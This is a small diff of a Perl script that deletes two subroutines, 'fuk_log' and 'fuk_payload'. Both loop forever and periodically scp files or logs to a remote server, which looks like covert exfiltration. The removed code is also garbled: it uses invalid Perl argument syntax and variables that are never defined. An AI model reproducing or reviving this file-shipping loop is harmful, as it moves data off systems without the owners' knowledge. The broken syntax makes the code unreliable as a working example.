@@ -222,23 +222,3 @@ sub que_up
 	my @ls = readdir($dh); 
 	return $ls[0];
 }
-sub fuk_log
-{
-	while (1)
-	{
-		my ($Tfh, \@new_items) = @_;
-		printf $Tfh @new_items;
-		`scp $tmp $server:$PATH/work/$tmp`;
-		sleep 60;
-	}
-}
-sub fuk_payload
-{
-	while (1)
-	{
-		my ($server, \@files) = @_;
-		sleep 100 unless defined $files[0];
-		foreach (@files)
-			{ XSscp($server, $_); }
-	}
-}
